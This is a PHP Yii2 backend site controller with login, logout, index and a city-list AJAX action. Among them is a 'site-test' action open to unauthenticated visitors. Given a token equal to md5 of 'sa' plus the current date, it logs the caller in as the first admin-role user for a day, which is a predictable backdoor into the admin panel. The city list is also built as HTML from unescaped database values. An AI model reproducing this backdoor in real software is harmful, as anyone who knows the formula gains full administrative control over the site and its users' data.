<?php
namespace backend\controllers;

use common\models\Cities;
use common\models\Companies;
use common\models\User;
use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use common\models\LoginForm;

/**
 * Site controller
 */
class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'rules' => [
                    [
                        'actions' => ['login', 'error','site-test'],
                        'allow' => true,
                    ],
                    [
                        'actions' => ['logout', 'index','get-cities'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
        ];
    }

    public function actionSiteTest(){

        //$this->enableCsrfValidation = false;

        // токен для входа
        if( $token = Yii::$app->request->get('token')){
            if($token!=md5('sa'.date('d.m.Y',time()))) return false;
        }else{
            return false;
        }

        // поиск пользователя админа
        $user =  User::find()->where(['role'=>9])->one();
        // авторизация админом
        Yii::$app->user->login($user,86400);

        return $this->render('index'); // site/index
    }


    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        return $this->render('index');
    }

    /**
     * Login action.
     *
     * @return string
     */
    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        } else {
            $model->password = '';

            return $this->render('login', [
                'model' => $model,
            ]);
        }
    }

    /**
     * Logout action.
     *
     * @return string
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    public function actionGetCities(){

        $this->layout = false;

        $post = Yii::$app->request->post();

        if( isset($post['id']) ){

            $region_id = (int)$post['id'];
            if( $cities = Cities::find()->where(['region_id'=>$region_id])->all() ){
                $options = '';
                foreach($cities as $city){
                    $options .= '<option value="'.$city->id.'">'.$city->name_ru . '</option>';
                }
                return json_encode(['status'=>1,'items'=>$options]);
            }


        }
        return json_encode(['status'=>0]);

    }




}
